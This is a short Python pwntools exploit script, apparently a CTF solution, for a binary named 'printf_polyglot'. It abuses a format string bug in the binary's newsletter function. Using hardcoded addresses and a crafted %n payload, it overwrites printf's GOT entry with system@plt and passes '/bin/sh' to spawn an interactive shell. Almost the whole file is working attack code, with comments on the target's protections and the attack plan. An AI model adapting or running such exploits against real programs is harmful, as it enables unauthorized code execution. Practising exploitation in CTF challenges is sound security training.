#This exploit is checked and works for kali 2019, it should work for other systems too.
from pwn import *
target=process('./printf_polyglot')

system=0x400A91

#I couldn't spot a bug in view_team,check_date and report_bug functions
#check_date has a potentially useful gadget, call system

#newsletter has a format string bug in printf(email), as email(the format string), is controlled by us.
#Interestingly, a segfault is placed before return, so no ROP.
#printf(email) is called twice though, so I guess we'll have to make use of that.

'''
checksec results:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

# This shows that GOT overwrite is possible
# Plan: Overwrite GOT of printf with system@plt , pass "/bin/sh\x00" as the argument to printf to call system("/bin/sh\x00")
#Important gadgets
system_plt=0x4006e0
printf_got=0x602048
#go into newsletter
print(target.recvuntil("Exit.\n"))
target.sendline("3")
#buf is the 24 stack addresses away for printf
#GOT overwrite and arguement for next call to printf, which will then be system.
print(target.recvuntil("below:\n"))
fs="/bin/sh #"+"%"+str(system_plt-9)+"x"+"%27$ln"+p64(printf_got)
target.sendline(fs)
target.sendline("Y")
target.interactive()



